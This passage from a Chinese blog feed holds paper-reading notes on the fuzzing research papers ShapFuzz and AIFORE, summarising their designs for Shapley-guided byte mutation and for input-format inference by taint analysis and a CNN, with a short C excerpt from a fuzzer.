title="Motivation"></a>Motivation</h3><p>​由于字节是协同变异以探索代码的，因此作者使用Shapley值的方法来分析字节的贡献。作者首先通过以下两个观察实验来确定<strong>字节具有不同的重要性</strong></p><p><strong>Experiment of Shapley Analysis</strong></p><p>​为了计算种子中字节的Shapley Value, 作者将一个组合发现的新边数量视为收益。然而，一个长度为N的种子有256^N种可能的组合，数量过多无法进行测试。为获得字节的相对准确的Shapley Value，作者对单个种子进行48小时的随机变异模糊测试。</p><ul><li><p><strong>观察实验一</strong>：</p><ul><li><p>使用AFL++对18个程序进行模糊测试。一个程序的corpus只存在一个种子，且不更新种子队列。即持续地变异（<strong>移除改变种子长度的变异器</strong>）所选的初始种子。重复实验六次。</p></li><li><img src="/2024/08/07/ShapFuzz%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/image-20240918153625060.png" class="" title="image-20240918153625060"></li><li><p>期间，执行恢复策略。即{1,3,4}字节组合发现新边收益为R0，那么将执行其所有子集，得到收益R1~Rn，共同计算各个字节的Shapley值。（为了与Shapley值法的定义保持一致）</p></li><li><p>实验结果如下：</p><img src="/2024/08/07/ShapFuzz：论文阅读/image-20240918153959734.png"  alt="image-20240918153959734" style="zoom:67%;" /><p>每个点表示对于一个程序和一个初始种子，前 X% 的字节贡献了 Y% 的新边。<strong>由实验结果可知，一小部分字节对发现新边的贡献最大。</strong></p></li></ul></li><li><p><strong>观察实验二</strong>：</p><ul><li><p>使用GreyOne的FTI方法分析16个程序中<code>CMP</code>之间相关字节的重叠情况。即，给定一个<code>CMP</code>和种子，如果改变种子的第i个字节会导致<code>CMP j</code>的值发生改变，那么字节i与<code>CMP j</code>相关。实验结果如下图所示：</p></li><li><img src="/2024/08/07/ShapFuzz：论文阅读/image-20240918154941625.png"  alt="image-20240918154941625" style="zoom:67%;" /><p>大多数字节与多个CMP指令相关。这个实验表明，CMP之间相关字节的共享是一种普遍现象。换句话说，<strong>少部分字节与多个路径约束相关</strong>。</p></li></ul></li></ul><p>​通过观察实验，作者发现，只有<strong>少部分字节对探索新区域贡献最大</strong>，因此可以利用Shapley分析来获取这些高重要性字节，并在模糊测试期间分配更多能量给它们。由于与约束相关的字节通常与多个CMP指令相关，因此专注于高重要性字节可以提高在未见路径中发现代码的效率。</p><h3 id="Design"><a href="#Design" class="headerlink" title="Design"></a>Design</h3><p>​SHAPFUZZ专注于字节变异，量化字节位置的重要性。将相同长度的种子理解为一个Shapley分析过程。即，从同一个原始种子保留下来且不改变长度的种子属于同一个合作博弈，并且共享相同的字节Shapley Value。为了将Shapley Analysis融入到Fuzzing中，作者提出以下设计方案。</p><img src="/2024/08/07/ShapFuzz：论文阅读/image-20240918155507735.png"  alt="image-20240918155507735" style="zoom:67%;" /><ul><li><p>Shapley Analysis Among Bytes</p><p>Shapley Analysis，前文提过。指玩家联盟共同参与游戏并获得收益，假设联盟S在游戏中获得的收益为R，根据每个玩家的贡献程度来分配收益。Shapley值法能够量化每个玩家的贡献程度，因此合理分配联盟收益。</p><ul><li>一个长度为N的种子，有N个字节。将每个字节作为玩家，即有N个玩家。一次完整的Shapley分析会将2^N种组合的收益都计算得出。每一个字节组合（一次变异中的所有发生变化的字节组成）都作为一个联盟。每一个联盟的收益都会被算出。放在模糊测试中，每一个字节组合{x_1,x_2,…,x_i}都应该被变异执行一次，以获得收益（发现新边的数量）。</li></ul></li><li><p>Shapley Analysis In One Seed</p><ul><li>如果收益定为一次Fuzzing结束后新发现边的数量，由于新发现的边是通过与当前覆盖状态进行比较获得的，那么同样的字节组合在不同的时间执行相同的变异发现新边的数量是不同的。举例来说，在Fuzzing初期字节组合{1,3,4}变异并执行结束后会得到一个位图，与全局位图进行比较以确定是否发现新边。随着Fuzzing的进行，全局位图在不同时间有不同状态，所以在另一时间该字节组合以相同变异并执行得到的位图虽然没有变化，但是全局位图发生了变化，相比较所得到的新边数量就会发生变化。</li></ul><p>​    因此，作者将收益R定义为<strong>自新边(self-new edges)<strong>的数量，作者定义</strong>自新边为将输入i发现的边与初始种子S0发现的边进行比较时发现的新边</strong>。也就是说，每个组合变异执行得到的位图不与全局位图进行比较，而是与初始种子的位图进行比较。</p></li><li><p>Shapley Analysis Across Seeds</p><p>从Shapley分析的角度看，多个种子可以被视为一个种子。如果变异没有改变原始种子S0的长度，该变异得到的新种子S1实际上就是种子S0的Shapley分析的一个组合。因此，可以将长度相同的种子视作一个家族(family)。那么”family”会有以下特征：</p><ul><li>家族中所有种子都由初始种子变异而来</li><li>所有种子具有相同的长度。</li><li>每个种子的字节位置一致，因此每个字节Shapley值在每个种子中是一致的</li></ul><p>执行Shapley Analysis的过程会产生新的种子，如果新种子长度没有变化，那么其实际上就是原始种子Shapley Analysisi的一个字节组合。如果长度发生变化，则字节的相对位置，以及Shapley Analysis中的玩家数量发生了变化。针对于Fuzzing过程中长度发生变化的种子，作者采取以下措施：</p><ul><li>针对于改变长度的变异操作，将这些操作存储至M1中。<ul><li>若改变长度的种子未发现“新边”（not self-new edges），那么不保存，抛弃即可。（遵循遗传算法）</li><li>若改变长度的种子发现了“新边”，则利用M1撤销长度变异操作。再次执行。<ul><li>倘若能够发现相同的“新边”，那么则将撤销长度变异操作后的新种子加入其初始种子的family中。</li><li>倘若不能够发现相同的“新边”，那么将改变长度的新种子作为初始种子加入一个新的family</li></ul></li></ul></li></ul><p>该过程如下图所示：</p><img src="/2024/08/07/ShapFuzz：论文阅读/image-20240918155413346.png"  alt="image-20240918155413346" style="zoom:67%;" /></li></ul><p>​Shapley值的更新可以嵌入到Fuzzing的变异阶段。变异产生的未改变长度的测试实例都是一个Shapley分析中的字节组合。该测试实例执行后，都可以根据执行结果计算收益R。利用这个收益R更新字节的Shapley值。但是更新期间，应该只针对与约束条件相关的字节。换句话说，只更新与约束条件相关字节的Shapley值。那么，在某次字节变异组合{1,3,4}执行后发现了自新边。需要精简该字节变异组合，筛选出其中的必要字节。即，分别执行{1,3},{1,4},{3,4}。倘若{1,3}的执行结果与{1,3,4}的结果相同，那么字节{4}便是冗余字节。此次Shapley值更新将排除字节{4}。</p><p>​更新过程中，需要计算每个字节Shapley值，也就是每个字节对字节组合的边际贡献。根据Shapley值法的计算方式，需要获得所有子集的收益R，上述例子中必要字节组合{1,3}的值更新过程中，会执行{1},{3}获得其收益R1和R3以计算字节{1},{3}对联盟{1,3}的边际贡献。</p><blockquote><p>在代码实现中，字节的Shapley值&#x3D;自新边数量&#x2F;必要字节数量。且每个必要字节的Shapley值相同。（如果严格按照Shapley值法定义来计算，在Fuzzing期间应该恢复字节组合的子集并执行。这样效率就过低，且计算出的Shapley值仍然是一个不完整的。）</p></blockquote><p>​随着Fuzzing的进行，每个家族的字节Shapley值会不断更新。仅根据当前计算得到的字节Shapley值来选取需要变异的字节是不够的，<strong>因为，Shapley值的计算仅基于输入空间的一部分得到</strong>，它不能保证具有高Shapley值的字节总是保持高值。所以，当Fuzzing过程中，一些字节因为高Shapley值被频繁选中但未发现新边时，便不能在这些字节上浪费更多能量。所以需要在<strong>高Shapley值</strong>和<strong>低频选择字节</strong>之间平衡。</p><ul><li><p>Shapley-guided Byte Selection</p><p>ShapFuzz使用上下文多臂老虎机（CMAB）来实现Shapley值的权衡。而作者所采取的求解算法为最大置信区间上界算法（Upper Confidence Bound），置信区间是概率统计和统计推断比较重要的概念，其衡量一个随机变量分布的置信水平。置信区间越大，越说明这个随机变量不确定因素更大。UCB则是采用置信水平来实现对Exploitation和Exploration之间的平衡。</p><p>利用Shapley值，为字节选择构建概率分布，即CMAB为每个字节计算分数。分数越高的字节被选择的概率越高。</p><ul><li><p>$$Score(s,p)&#x3D;E[r_{s,p}|f_S]+0.5U_{s,p}+\phi_p$$</p><ul><li>其中r_{s,p}是该输入所执行路径的稀有性。</li></ul></li><li><p>在代码中实现的方案</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// before havoc mutation stage.</span><br><span class="hljs-comment">// centers had been generated.</span><br><span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;centers_num;i++)&#123;<br>    <span class="hljs-comment">// distance: between ancestor seed path and every center path.</span><br>  <span class="hljs-type">double</span> distance = (<span class="hljs-type">double</span>)cal_distance(cur, afl-&gt;centers[i], map_size);<br>    <span class="hljs-comment">// input-&gt;feature_vec-&gt;data is the cosine similarity of every center. </span><br>  afl-&gt;queue_cur-&gt;feature_vec-&gt;data[i] = distance;<br>&#125;<br><span class="hljs-comment">// every_score:  one byte of mutation.</span><br>every_score = r1-&gt;data[<span class="hljs-number">0</span>] + m3 + ancestor_node-&gt;mutated_pos[ii].SV;<br><span class="hljs-comment">// ...</span><br>score = sum(every_score);<br><span class="hljs-comment">// generate a random number between 0 and score.</span><br><span class="hljs-type">double</span> choose = ((<span class="hljs-type">double</span>)rand()/RAND_MAX) * score;<br><span class="hljs-comment">// history_mutation_sequence_idx is the quantity of mutations bytes </span><br><span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;history_mutation_sequence_idx;i++)&#123;<br>    <span class="hljs-comment">// find first byte greater than choose  </span><br>    <span class="hljs-keyword">if</span>(afl-&gt;distribution[i] &gt;= choose)&#123;<br>        <span class="hljs-keyword">return</span> afl-&gt;history_mutation_sequence[i];<br>&#125;<br>&#125;<br><span class="hljs-comment">// else return random one position</span><br></code></pre></td></tr></table></figure><p>对every_score作如下说明：</p><p>$$r_1 &#x3D; (A^{-1}\times b)^T \times f_s，m_3 &#x3D; 0.5 \times \sqrt{f_s^T \times A^{-1} \times f_s}，SV&#x3D;Shapley Value.$$</p><p>f_s存储于<code>feature_vec</code>中。A被初始化为k × k，对角线全为1的矩阵。b被初始化为k × 1，全为0的矩阵。其中A矩阵的更新方式为$$A &#x3D; A.data+ f_s × f_s^T$$。B矩阵的更新方式为$$b &#x3D; b.data+ R × f_s$$,其中R为收益。</p></li></ul></li></ul><p>作者提出的一些局限性：</p><ul><li>Shapley值计算的开销：Shapley将字节变异的过程建模为一个合作博弈，并使用Shapley分析来量化每个字节的贡献。假设在一个变异中发现了自新边，并且其变异位置的数量为N。为了计算Shapley值，我们需要分析在$$2^N$$个变异位置子集中发现的自新边数量。为了降低开销，SHAPFUZZ使用两种特殊情况来简化Shapley分析过程。首先，如果存在不影响自新边结果的冗余字节，我们移除这些字节以减少N。其次，如果变异字节是发现自新边所必须的，那么这些字节具有相同的Shapley值。然而，如果这两个条件都不满足并且N很大，就会引入一些开销。将来，我们可以使用轻量级和改进的Shapley分析算法来缓解这个问题。</li><li><strong>可变种子长度</strong>：此外，SHAPFUZZ建立了一个族系系统来减轻Shapley分析带来的开销。在一个族系中，同一族系的种子对于字节具有相同的Shapley值。然而，在维护族系时，我们忽略了改变长度的变异输入。这是因为使用改变种子长度的变异器可能会扰乱种子种的字节位置，我们无法实现种子间的位置映射。将来，我们可以研究可变长度Shapley分析的数学理论。<strong>在现有版本中，如果通过改变长度生成一个新的种子，我们将使用这个种子创建一个族系来缓解这个问题。</strong></li><li><strong>自新边影响</strong>：随着时间的推移，新边发现变得越来越困难，SHAPFUZZ  利用自新边作为衡量收益和识别可能影响多个分支的字节的指标。然而，在某些情况下，导致自新边的字节并不一定会导致发现额外的新的边。这些自新边可能已经被其他种子发现。因此，具有高沙普利值的字节实际上可能比沙普利值所指示的贡献更少。如果我们为这些字节分配了过多的能量，会导致模糊效率下降。例如，假设种子中的字节 i 与 y 条边相关联。如果所有这 y 条边都被探索过，我们可以推断字节 i 已经做出了重大贡献。然而，由于与字节 i  相关的所有边都被探索过，为字节 i 分配任何能量都不会帮助发现新的边。</li><li><strong>族系内部语义一致性</strong>：为了减少计算沙普利值的开销，同一个族系中的种子共享相同的Shapley值。然而，尽管实施了严格的族系构建方法（具有遗传关系和相同长度的种子），但仍然可能存在种子之间语义不一致的情况。语义不一致会导致具有不同含义的字节共享相同的沙普利值，从而错误地估计字节的重要性。例如，**长度字段通常可以决定后续字节的语义。在这种情况下，我们的方法无法保证种子之间的语义一致性。**假设存在一个种子 A，其中字节 i 是一个长度字段。种子 B 是通过变异字节 i 从种子 A 派生出来的。由于长度字段的改变直接改变了后续字节的含义，因此字节  j（紧随字节 i，位于种子 A 和种子 B 中的相同位置）很可能具有不同的含义。这意味着即使种子 A 和种子 B 具有相同的长度和遗传关系，种子 A 和种子 B 中的字节 j 在语义上也不一致。如果我们继续在这两个种子中共享字节 j  的沙普利值，就会导致Shapley值不准确，使一些低效的字节被分配到更高的变异能量，从而影响模糊效率。</li></ul><h3 id="Questions-Ideas"><a href="#Questions-Ideas" class="headerlink" title="Questions&amp;Ideas"></a>Questions&amp;Ideas</h3><ul><li>以自新边为收益R，但是代码中的原始种子的virgin_bits会改变。那这跟文章中自新边的定义便冲突了。同一变异还是会获得不同收益。</li><li>Shapley值计算方式效率很高，但可能指导价值就不够大。<ul><li>每个字节的Shapley值更新方式: self-new edges &#x2F; necessary bytes</li><li>并且，每一次变异执行后都会累加。那么字节的Shapley值实质就是，这个字节从Fuzzing开始至现在发现自新边的能力。而自新边的定义在代码中又被修改成”family”中全局的virgin_bits。**那么针对同一个”family”而言，就是给历史发现“新边”数量越多的字节分配更多的能量。**再根据多臂老虎机，在能量低次数少与能量高次数高的字节间平衡。所以，这个Shapley值法的应用，笔者认为是作者为了发论文所附加上的，代码也应可以简化。</li></ul></li><li>以下是笔者一些ideas，当然建立于Shapley值能够很好应用于Fuzzing的前提下。<ul><li>针对文章提出的语义一致性问题，可以使用Pit文件来指导变异。针对一些会改变种子语义的字段变异，便不适用Shapley值或使用一个较低的值。等待CMAB选中这些特殊语义字段时，再决定如何变异。（参考Peach fuzzer）</li><li>可以尝试在AFL++上实现一个基于字节历史表现来分配变异能量,并利用CMAB来平衡低次数字节与高次数字节的策略。并看看和SHAPFUZZ的效率差异。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Paper</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Paper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AIFORE：论文阅读</title>
    <link href="/2024/08/02/AIFORE%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    <url>/2024/08/02/AIFORE%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="AIFORE-Smart-Fuzzing-Based-on-Automatic-Input-Format-Reverse-Engineering"><a href="#AIFORE-Smart-Fuzzing-Based-on-Automatic-Input-Format-Reverse-Engineering" class="headerlink" title="AIFORE: Smart Fuzzing Based on Automatic Input Format Reverse Engineering"></a>AIFORE: Smart Fuzzing Based on Automatic Input Format Reverse Engineering</h2><p>AIFORE的模糊测试过程：</p><p>首先使用污点分析来识别每个Basic Block处理的输入字节，然后使用最小聚类算法识别不可分割的输入字段，并使用表征BB行为的神经网络模型学习它们的类型。使用设计出的一种新的能量调度算法，该算法基于推断出的输入格式存储信息（inferred format knowledge）。使用该算法来指导智能模糊测试。</p><p><strong>摘要</strong></p><p>了解程序的输入格式对于在模糊测试中有效生成输入至关重要。自动输入格式逆向工程代表了一种有吸引力但具有挑战性的学习格式的方法。在本文中，我们解决了自动输入格式逆向工程的几个挑战，并提出了一种只能模糊测试解决方案AIFORE，它充分利用了逆向格式并从中受益。</p><p>输入字段的结构和语义由处理它们的代码块（BB）决定，而不是输入规范。因此，我们首先利用字节级污点分析来<strong>识别每个BB处理的输入字节</strong>，然后使用<strong>最小聚类算法识别不可分割的输入字段</strong>，这些字段始终与一个BB一起处理，并使用神经网络模型来学习它们的类型，该模型描述了BB的行为。最后，我们设计了一种基于推断的格式知识的新型能量调度算法，以指导智能模糊测试。我们实现了 AIFORE  的原型，并评估了格式推断的准确性和模糊测试的性能，与最先进的（SOTA）格式逆向解决方案和模糊测试器进行了比较。AIFORE  在字段边界和类型识别的准确性方面显著优于 SOTA 基线。使用 AIFORE，我们在 15 个程序中发现了 20  个错误，这些错误被其他模糊测试器遗漏了。</p><p><strong>介绍</strong></p><p>了解输入格式对生成高质量的输入至关重要。输入格式描述了程序期望如何组织输入字节。理想情况下，格式良好的输入将被正确解析和处理，从而达到预期的结果。格式错误的输入将被程序中的健全性检查器过滤掉，并尽早丢弃。因此，模糊测试器可以按照格式规范生成输入，这将有助于绕过浅层代码中的一些健全性检查，最终到达并测试更深层、更复杂的代码。此外，由于程序中的健全性机制并不总是健全且完整的，因此更有可能触发意外行为或BUG，因此应该被模糊测试器优先考虑。因此，模糊测试器可以利用格式知识的指导，为exploration 和 exploitation目的生成有价值的输入。</p><p>输入格式推理(input format inference)和格式引导(format-guided)的smart fuzzing</p><p>这类模糊器的解决方案试图回答关于输入格式的三个核心问题：</p><ul><li>不同输入字段的边界在哪里(input fields boundaries)</li><li>这些字段属于哪种类型(input fields types)</li><li>如何利用输入格式的知识来指导fuzzing(how to guide fuzzing)</li></ul><p>输入字段边界识别(input field boundary recognition)</p><blockquote><p>关于输入字段边界识别，现有研究[2-4]主要依赖于统计分析或动态污点分析，将同一指令处理的字节归为一个独特的字段。这类解决方案有几个局限性。首先，一条指令可能会处理多个输入字段，例如在一个循环中，这些字段会被错误地合并为一个字段。此外，一条长的字段会被不同的指令处理，并被错误地分割成多个字段，因为一般来说，一条指令处理的数据不能超过机器字的大小（如 32 位中央处理器的 4 字节）。最后，通过统计分析识别字段需要大量不同的输入，而这些输入往往是无法获得的。</p></blockquote><p>输入字段类型识别(input field type identification)</p><blockquote><p>关于输入字段类型识别，现有的解决方案[5-7]通常依赖于先验知识（例如，一些标准库调用的参数类型，如strcpy）来提取传入的字段的类型。然而，这样的先验知识是分散的，并且需要密集的工程努力来转换为启发式规则并应用它们，这也将不可避免地引入假阳性和假阴性。此外，这样的解决方案通常只能识别程序变量类型（例如，int、数组和字符串）而不是语义类型（例如，幻数、大小或校验和），因为它们没有从语义级别对输入字段如何影响程序的行为进行建模。</p></blockquote><p>输入格式的利用(utilization of input format)</p><blockquote><p>使用输入格式来指导测试用例生成或变异以达到目标程序中的更深代码。</p></blockquote><p>The paper core idea: 由于输入字段是由基本块解释的，因此无论输入格式规范是什么样的，都可以从输入字段中推断出输入的结构和语义信息。因此，可以通过分析处理输入域的结构和语义，并利用这些知识进行smart fuzzing.</p><blockquote><p> 首先，AIFORE利用动态污点分析来了解每个BB处理哪些输入字节。注意，单个不可分割的字段可以由一个BB中的多个指令部分地处理，但是不太可能由多个BB部分地处理，因为这些BB将不总是一起被执行，但是不可分割的字段应该一起被分析。</p><p> 其次，AIFORE建立一个深度学习模型理解BB，即判断这些BBs所处理的输入字段类型。BB能够处理不同类型的输入字段（例如，大小、偏移量、枚举、校验和或幻数(magic number)）。因此，作者训练卷积神经网络(CNN)模型来学习BB如何处理不同类型的输入字段的模式，然后预测输入字段的语义类型。</p><p> 第三，在模糊测试期间，设计一种新的基于格式自动提取的能量调度算法以提高模糊效率。程序仍然可以接受不满足规范[1]的输入，以及不同格式变体的输入。输入格式的不同变体对程序行为有不同的影响。</p><ul><li>规范：Host of Troubles: Multiple Host Ambiguities in HTTP Implementations<ul><li>这篇论文深入分析了HTTP协议中关于Host头的几种模糊定义导致的各种漏洞，并提出了相应的解决方案。</li><li>Http协议规范中，Host头的定义存在多处模糊之处，导致不同HTTP实现之间对Host头的理解和解析存在差异。这些差异会导致安全漏洞、性能下降、甚至功能失效等问题。</li><li>论文重点分析的模糊定义：<ul><li>Host头中的端口号是否可选？RFC7230明确要求Host头必须包含端口号，但许多HTTP实现并没有严格遵守该规则。</li><li>Host头中的域名解析是否应该区分大小写？RFC1035明确规定DNS域名解析区分大小写，但许多HTTP实现却忽略了这一点。</li><li>Host头是否应该包含路径信息？RFC7230没有明确规定，导致不同HTTP实现对路径信息处理存在分歧。</li></ul></li></ul></li></ul><p> 提出一个两步策略来利用格式信息(format knowledge)，即识别新的变体并优先考虑不经常测试的格式。首先，AIFORE挑选具有显著不同代码覆盖率的测试用例，并重新分析它们的输入格式，因为它们可能具有不同的格式。其次，我们优先考虑那些在fuzzing过程中测试频率较低的种子，并增加它们的突变能力。</p></blockquote><p>以readelf为例，分析并总结现有方法的局限性。（elf文件是一种目标文件格式，常见的ELF格式文件包括：可执行文件、可重定位文件(.o)、共享目标文件(.so)、核心转储文件等，主要用于Linux平台）。<strong>一个完整的ELF文件一般会包括如下几个内容：文件头、Section头、Program头和Section</strong></p><img src="/2024/08/02/AIFORE：论文阅读/image-20240724141934191.png"  alt="image-20240724141934191" style="zoom:50%;" /><p>一个ELF文件由几个数据结构组成（例如，文件头、Section头、Program头和Section头），每个头由几个字段组成。对于Figure1所示的文件头结构，它具有由连续字节组成的一些字段（例如，从偏移0x00到0x03的幻数）和具有单字节值的某些字段（例如，偏移量为0x04的类）。以偏移0x12处的e_mahcine为例，它表示机器架构（例如，AArch64、i386或x86_64），这会改变ELF的结构（例如，地址字段的长度可以是四个或八个字节，用红框标记）。</p><img src="/2024/08/02/AIFORE：论文阅读/image-20240724143204076.png"  alt="image-20240724143204076" style="zoom:50%;" /><p>Listing 1显示了readelf的代码片段，它解析elf格式的输入。解析输入文件有两个主要步骤。</p><ul><li>第一步是读取输入并初始化与输入字段对应的某些变量。例如，第3行到第6行从输入中读取字段并初始化相应的变量：file_header.e_machine,file_header.e_shnum。</li><li>第二步是在函数process_file_header中进一步处理这些初始化的变量。不同的BB用于处理不同类型的变量。例如，在第21行一次比较一个字节的四字节幻数，而e_machine作为具有switch-case语句的枚举处理。</li></ul><p>并且，readelf在解析elf文件时，可以观察到以下结果。</p><p><strong>结果1</strong>：在大多数情况下，不可分割字段中的字节在一个BB中一起解析。例如，两字节字段e_machine在第4行开始的块和第10行开始的另一个块中作为一个整体来处理。对于字段e_shstrndx，它在第27行的BB中一起解析。然而，存在这样的极端情况，其中一个字段的部分（例如，在第21行解析的幻数字段）可以在不同的BB中解析。此外，一个BB可以处理多个任务并且在运行时被执行多次。例如，BYTE_GET函数中的BB被执行多次以从输入缓冲区读取并提取不同的字节以分配不同的变量。</p><p><strong>结果2</strong>：不同类型的程序代码处理字段使用不同的模式。例如，枚举变量（e_machine）很可能由switch-case语句处理，而大小变量(e_shnum)可以通过数学运算来处理。</p><p><strong>结果3</strong>：输入的结构可能不同，程序将使用不同的代码来解析输入。例如，e_machine的变体可能表示不同的数据结构，如figure 1中用红框标记的地址字段的长度。如果在fuzzing过程中发现了新的结构，模糊器应该重新分配能量，并使用相应的格式信息来获得更高的覆盖率。</p><p><strong>AIFORE的架构图Figure 2</strong></p><img src="/2024/08/02/AIFORE：论文阅读/image-20240718104525414.png"  alt="image-20240718104525414" style="zoom: 80%;" /><p>在模糊化期间，如果种子带来的覆盖增量是可区分的（即增加平均覆盖率的3%），将其标记为有价值的种子。对于每个有价值的种子，使用AIFORE分析其格式和模糊的格式模型，包括字段边界和字段类型的提取知识的文件。AIFORE的核心是，输入格式信息可以从处理输入文件的BB模式中推断出来。因此，**AIFORE利用污点分析来构建输入字节和处理它们(输入字节)的BB之间的映射。**Figure 3演示从readelf中获取的两个BB，它们解析先前示例中的输入格式。每条指令末尾的注释列出了它所处理的输入字节的偏移量，这些偏移量由污点分析引擎跟踪。</p><img src="/2024/08/02/AIFORE：论文阅读/image-20240725094331734.png"  alt="image-20240725094331734" style="zoom:50%;" /><p>Figure 2 中存在三个模块联合逆向输入格式并平衡种子的模糊能量 </p><ul><li><strong>Field Boundary Analysis</strong><ul><li>第一个模块是分析字段边界并将输入分割为字段，即连续字节。连续字节的意思就是，它们在对程序行为的影响方面具有相同的语义（连续字节将一起被BBs处理）</li></ul></li><li><strong>Field Type Classification</strong><ul><li>第二个模块是通过一个基于CNN的模型预测字段类型信息。该模型经过训练可以理解程序如何解析不同类型的字段。字段边界和字段类型由格式模板(pit文件)组成。<ul><li>格式模板（<strong>Peach Pit文件</strong>） ——— PeachFuzzer的配置文件。<ul><li>一种XML文件，包含多个元素，这些元素描述测试用例生成器的数据模型、数据类型、范围、约束和默认值等信息。</li></ul></li></ul></li><li>对于每个字段，记录其<strong>边界</strong>及其起始位置、大小及其类型。</li></ul></li><li><strong>Fuzzing with Power Scheduling</strong><ul><li>决定哪个种子值得进行格式提取，并将那些变异较小的格式重新分配更多的fuzzing power</li></ul></li></ul><p><strong>字段边界分析</strong></p><hr><p>识别不同字段的边界是输入格式逆向工程的一项基本任务。<strong>由连续输入字节组成的字段通常在每个BB中作为整体（之前由readelf示例观察得出结果）</strong>。AIFORE因此使用最小聚类(MC)方法从块级别而非像Tupni和Polyglot从指令级别拆分字段。其过程如<strong>Algorithm 1</strong>所示。</p><img src="/2024/08/02/AIFORE：论文阅读/image-20240725110821542.png"  alt="image-20240725110821542" style="zoom:50%;" /><p>首先将二进制代码拆分为BB。例如，将Listing 1中源码第四行拆分成两个BB。其次，收集并合并在一个BB中处理的输入字节。例如，Figure 3中的第一个BB处理偏移量为18和19的两个输入字节，第二个BB（Listing 1中的第一行的BYTE_GET）处理偏移量为16-19和40-51的字节。BYTE_GET在程序中很常见，因为它们首先将输入中的不同字段作为一个整体读取到内存中的缓冲区，然后程序将对应地解析它们。第三，根据每个块的污点属性拆分字段，包括一般的bb（例如，BYTE_GET）和特定字段的bb。对于连续字节的每个MC，在所有bb中作为一个整体处理，例如Figure 3中的偏移量为18和19的两个输入字节，将被识别为一个字段。</p><p><strong>MC方法</strong>（蒙特卡洛算法）</p><p><a href="https://zhuanlan.zhihu.com/p/70024772">https://zhuanlan.zhihu.com/p/70024772</a></p><p>MC方法可以正确地找到大多数输入字段。但是，依然有些例外，字段边界与规范不同。这是因为程序以自己的方式解析字段。例如，程序可以逐个字节而不是整个字节检查幻数。在这种情况下，MC可能无法将字节分组到单个字段。</p><p><strong>字段类型识别</strong></p><hr><p>基于观察结果二，提出对BBs的模式进行分类，以推断它们处理的输入字段的类型。具体来说，给定一个字段类型以及解析和使用该类型字段的代码片段，构建一个CNN模型将代码片段映射到字段类型。因此，需要收集大量的训练数据，包括代码片段和它们处理的字段类型。然后，训练CNN模型来从目标代码片段中预测字段类型。</p><p><strong>字段类型</strong></p><p>考虑语义类型（例如，偏移或校验和）而不是它们的程序变量类型（例如，int或string）。这样的语义类型比变量类型更难识别，但更有利于fuzzing。AIFORE支持六种语义类型。</p><ul><li>Size。Size字段表示由输入文件中的一个或多个字段组成的数据块的长度。例如，Figure 1中偏移量0x28处的e_ehsize字段表示header 大小为0x34.</li><li>Enumeration。此类型的字段只能接受有限的一组有效值。例如，e_type字段指示二进制类型，取ELF格式中定义的七个有效值之一。</li><li>Magic number。此类型的字段通常用作文件的签名。例如，ELF文件的前四个字节是一个值为”\x7fELF”的Magic number。</li><li>String。此类型的字段指示ASCII、Unicode或其他编码形式的字符串文字。</li><li>Checksum。校验和，用于验证输入中部分数据的完整性，常见于媒体文件、压缩文件和字体格式。</li><li>Offset。偏移量，指示输入中另一个数据块的位置。例如，Figure 1中偏移量为0x20的e_shoff字段表示Section头的偏移量。</li></ul><p><strong>模型训练数据收集</strong></p><p>使用010 Editor 工具提供的输入格式信息作为基础。选择一些众所周知的格式和处理它们的程序，然后执行污点分析。给定一个输入字段，根据真实数据确定其类型，定位其偏移量，然后从污点分析结果中过滤出处理过该字段的相关基本块。对于每个相关BB，我们执行前向切片（即Algorithm 2中的第10行）<strong>来合并与给定字段具有重要语义依赖关系的连续子基本块</strong>。</p><img src="/2024/08/02/AIFORE：论文阅读/image-20240725154606906.png"  alt="image-20240725154606906" style="zoom: 50%;" /><p>以Figure 4中的代码片段为例，<code>size</code>字段在第一个块中被加载并与一个阈值进行比较，接着在下一个块中被<code>malloc</code>函数调用。通过前向切片，将这两个块合并在一起，以便了解<code>size</code>字段会被<code>malloc</code>函数使用，并收集更多有意义的特征。</p><img src="/2024/08/02/AIFORE：论文阅读/image-20240725163803818.png"  alt="image-20240725163803818" style="zoom: 50%;" /><p><strong>向量化的数据</strong></p><p>首先，基本块中指令的语义信息对于确定程序如何处理字段至关重要。为了简化分析，将BB中的指令转换为中间表示（IR，例如VEX[21]）。使用独热编码对每个处理给定输入字段的指令进行相应的IR操作向量化。由于VEX中的IR操作数量对于独热编码来说太大，<strong>选择大约100个常用的IR操作。</strong></p><p>此外，将<strong>标准库调用</strong>的使用视为重要的语义信息。首先选择一个常见的标准库函数列表，例如memcpy、strcpy和malloc。对于每个此类库函数的调用，将在独热编码（one-hot）中记录它。最后，记录基本块中使用的<strong>格式字符串</strong>，并将它们计入语义信息的特征中。例如，%x表示一个整数，而%s可能暗示一个字符串字段。此特征也以独热编码(one-hot)的形式呈现。</p><p>以上三部分的特征被连接在一起（Algorithm 2第26行）。如果一个字段由多个代码切片处理，那么这些切片的向量将被加在一起（第26行的左侧）以获得该字段的整体特征向量。因此，使用（特征向量，字段类型）pairs来训练神经网络模型。</p><p><strong>能量调度</strong></p><hr><p>通过字段边界识别和字段类型识别后，在使用这些信息辅助模糊测试时，仍然面临以下两个问题。首先，模糊测试开始，应该对哪个种子进行格式提取（即格式分析的能量调度）？其次，我们如何平衡在变异过程中产生的不同格式变体的fuzzing power（即，用于变异的能量调度）？如Algorithm 